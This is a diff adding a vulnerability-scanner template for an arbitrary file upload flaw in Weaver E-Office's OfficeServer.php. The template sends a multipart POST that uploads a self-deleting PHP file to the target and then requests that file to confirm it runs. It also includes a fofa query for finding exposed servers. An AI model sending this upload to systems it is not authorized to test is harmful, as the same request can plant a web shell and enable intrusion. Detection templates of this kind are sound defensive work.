@@ -1,0 +1,43 @@
+id: weaver-eoffice-officeserver-fileupload
+
+info:
+  name: 泛微OA E-Office OfficeServer.php 任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |
+    泛微OA E-Office OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息
+    fofa: app="泛微-EOffice"
+  tags: weaver,eoffice,fileupload
+  created: 2024/02/21
+
+set:
+  randstr: randomLowercase(12)
+  rbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /eoffice10/server/public/iWebOffice2015/OfficeServer.php
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data;name="FileData";filename="{{randstr}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5("{{rbody}}");unlink(__FILE__);?>
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data;name="FormData"
+
+        {'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{randstr}}.php'}
+        ------WebKitFormBoundary{{rboundary}}--"
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /eoffice10/server/public/iWebOffice2015/Document/{{randstr}}.php
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(rbody)))
+expression: r0() && r1()
